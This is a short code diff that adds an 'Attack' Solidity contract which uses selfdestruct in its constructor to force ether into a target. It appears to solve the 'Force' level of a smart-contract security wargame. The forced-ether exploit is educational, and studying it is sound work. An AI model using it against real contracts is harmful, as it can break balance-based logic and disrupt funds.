@@ -7,12 +7,13 @@ contract Force { /*
     ____/ o o \
     /~____  =ø= /
     (______)__m_m)
-                   */ 
-                   
-                   
-                   
-                   
+                   */ }
+
+
+contract Attack {
+
+     constructor(address payable _target) payable {
+          selfdestruct(_target);
+
+     }
 }
-
-
-
